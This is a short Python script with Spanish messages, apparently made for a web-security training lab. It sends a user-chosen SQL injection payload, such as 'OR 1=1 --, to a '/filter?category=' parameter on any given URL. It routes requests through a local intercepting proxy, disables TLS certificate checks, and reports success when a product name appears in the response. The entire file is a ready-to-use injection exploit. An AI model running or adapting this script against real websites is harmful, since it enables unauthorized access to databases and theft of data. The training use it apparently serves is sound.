import requests
import sys
import urllib3

# No mostrar advertencias
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if "Gym Suit" in r.text:
        return True
    else:
        return False 

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Utilizacion: %s <url> <payload>" % sys.argv[0])
        print('[-] Ejemplo: %s www.pagina.com "\'OR 1=1 --"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("[+] Se ha realizado la inyección SQL exitosamente")
    else:
        print("[-] No se pudo realizar la inyección SQL")